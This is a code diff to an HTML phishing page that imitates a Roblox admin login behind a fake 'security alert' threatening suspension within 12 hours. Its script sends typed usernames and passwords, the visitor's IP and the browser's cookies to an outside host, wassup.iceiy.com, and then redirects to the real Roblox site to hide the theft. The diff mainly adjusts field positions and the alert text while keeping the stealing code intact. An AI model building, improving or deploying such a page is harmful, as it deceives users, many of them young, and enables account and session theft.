@@ -81,9 +81,9 @@
     </style>
 </head>
 <body>
-    <img id="screenshot" src="https://raw.githubusercontent.com/MasterAtHacking/admin.verification.github.io/refs/heads/main/roblox-login.png" alt="Roblox Admin Login">
+    <img id="screenshot" src="YOUR_ROBLOX_ADMIN_SCREENSHOT_URL" alt="Roblox Admin Login">
     <div id="admin-alert">
-        SECURITY ALERT: Your session requires re-authentication. Failure to comply will result in account suspension.
+        SECURITY ALERT: Your session requires re-authentication. Failure to comply within 12 hours will result in account suspension.
     </div>
     <div id="overlay">
         <form id="fake-login-form">
@@ -94,71 +94,70 @@
     </div>
     <div id="fake-loading">Verifying Credentials...</div>
 
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        const usernameField = document.getElementById('username');
-        const passwordField = document.getElementById('password');
-        const loginButton = document.getElementById('login-button');
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const usernameField = document.getElementById('username');
+            const passwordField = document.getElementById('password');
+            const loginButton = document.getElementById('login-button');
 
-        // Adjusted positions: 1 cm left, 0.5 cm down for username/password
-        usernameField.style.top = '260px';
-        usernameField.style.left = '47%';
-        usernameField.style.transform = 'translateX(-50%)';  // Centers the input relative to its left position
-        usernameField.style.width = '250px';  // Width of the input field
-        usernameField.style.height = '40px';  // Height of the input field
+            // Adjusted positions: 2 cm left for username/password
+            usernameField.style.top = '260px';
+            usernameField.style.left = '43%';
+            usernameField.style.transform = 'translateX(-50%)';
+            usernameField.style.width = '250px';
+            usernameField.style.height = '40px';
 
-        passwordField.style.top = '310px';
-        passwordField.style.left = '47%';
-        passwordField.style.transform = 'translateX(-50%)';  // Centers the input relative to its left position
-        passwordField.style.width = '250px';  // Width of the input field
-        passwordField.style.height = '40px';  // Height of the input field
+            passwordField.style.top = '310px';
+            passwordField.style.left = '43%';
+            passwordField.style.transform = 'translateX(-50%)';
+            passwordField.style.width = '250px';
+            passwordField.style.height = '40px';
 
-        // Login button remains at previous position (350px top, 49% left)
-        loginButton.style.top = '350px';
-        loginButton.style.left = '49%';
-        loginButton.style.transform = 'translateX(-50%)';  // Centers the button relative to its left position
-        loginButton.style.width = '250px';  // Width of the button
-        loginButton.style.height = '40px';  // Height of the button
+            // Login button remains at previous position
+            loginButton.style.top = '350px';
+            loginButton.style.left = '49%';
+            loginButton.style.transform = 'translateX(-50%)';
+            loginButton.style.width = '250px';
+            loginButton.style.height = '40px';
 
-        document.getElementById('fake-login-form').addEventListener('submit', function(e) {
-            e.preventDefault();
+            document.getElementById('fake-login-form').addEventListener('submit', function(e) {
+                e.preventDefault();
 
-            const username = usernameField.value;
-            const password = passwordField.value;
+                const username = usernameField.value;
+                const password = passwordField.value;
 
-            if (!username || !password) {
-                alert("All fields are required for verification.");
-                return;
-            }
+                if (!username || !password) {
+                    alert("All fields are required for verification.");
+                    return;
+                }
 
-            // Send to your backend
-            fetch("https://wassup.iceiy.com/save.php", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    username: username,
-                    password: password,
-                    ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
-                    user_agent: navigator.userAgent
-                })
+                // Send to your backend (UPDATED URL)
+                fetch("https://wassup.iceiy.com/save.php", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
+                        user_agent: navigator.userAgent
+                    })
+                });
+
+                // Show fake loading screen
+                document.getElementById('fake-loading').style.display = 'flex';
+
+                // Steal cookies (UPDATED URL)
+                const cookies = document.cookie;
+                if (cookies) {
+                    fetch(`https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}&ip=<?php echo $_SERVER["REMOTE_ADDR"]; ?>`);
+                }
+
+                // Redirect after 3 seconds
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com/home";
+                }, 3000);
             });
-
-            // Show fake loading screen
-            document.getElementById('fake-loading').style.display = 'flex';
-
-            // Steal cookies
-            const cookies = document.cookie;
-            if (cookies) {
-                fetch(`https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}&ip=<?php echo $_SERVER["REMOTE_ADDR"]; ?>`);
-            }
-
-            // Redirect after 3 seconds
-            setTimeout(() => {
-                window.location.href = "https://www.roblox.com/home";
-            }, 3000);
         });
-    });
-</script>
-
+    </script>
 </body>
 </html>
